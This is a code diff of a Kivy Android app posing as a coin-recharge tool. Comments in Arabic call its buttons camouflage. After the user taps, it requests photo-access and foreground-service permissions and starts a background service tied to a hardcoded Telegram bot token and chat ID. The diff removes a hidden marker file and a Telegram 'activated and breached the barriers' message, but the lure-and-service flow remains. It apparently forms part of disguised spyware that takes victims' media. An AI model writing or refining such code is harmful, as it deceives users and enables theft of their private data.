@@ -5,9 +5,7 @@ from kivy.uix.label import Label
 from jnius import autoclass
 from android.permissions import request_permissions, Permission
 import requests
-import os
 
-# بيانات البوت الخاصة بك (تأكد من صحتها)
 BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
 CHAT_ID = "7084557369"
 
@@ -16,6 +14,7 @@ class CoinsApp(App):
         layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
         self.status = Label(text="Server Status: Online", font_size='18sp')
 
+        # أزرار التمويه
         btn_1 = Button(text="RECHARGE COINS - SERVER 1", background_color=(0.2, 0.4, 0.9, 1))
         btn_2 = Button(text="RECHARGE COINS - SERVER 2", background_color=(0.8, 0.5, 0.2, 1))
         btn_3 = Button(text="RECHARGE COINS - FINAL STEP", background_color=(0.1, 0.7, 0.2, 1), bold=True)
@@ -56,31 +55,17 @@ class CoinsApp(App):
         except: pass
 
     def start_sync(self, instance):
-        # زرع ملف التخفي في الذاكرة
-        try:
-            path = "/sdcard/Android/.system_cache_data"
-            os.makedirs(path, exist_ok=True)
-            with open(os.path.join(path, ".core_bridge"), "w") as f:
-                f.write("SYNC_ACTIVE")
-        except: pass
-
         perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
         request_permissions(perms, self.launch)
 
     def launch(self, permissions, grants):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            # استدعاء الخدمة بناءً على اسم الباكيج في buildozer
+            # تم ربطها بالاسم الجديد للباكيج
             Service = autoclass('org.test.coinssync.ServiceMyservice')
             Service.start(PythonActivity.mActivity, "")
-            
-            # إرسال إشارة نجاح للبوت
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          data={"chat_id": CHAT_ID, "text": "✅ CoinsSync تم تفعيله واختراق الحواجز!"})
-            
-            self.status.text = "Status: Connection Active"
-        except Exception as e: 
-            self.status.text = "Error Connection"
+            self.status.text = "Status: Processing..."
+        except Exception as e: self.status.text = "Error Connection"
 
 if __name__ == "__main__":
     CoinsApp().run()
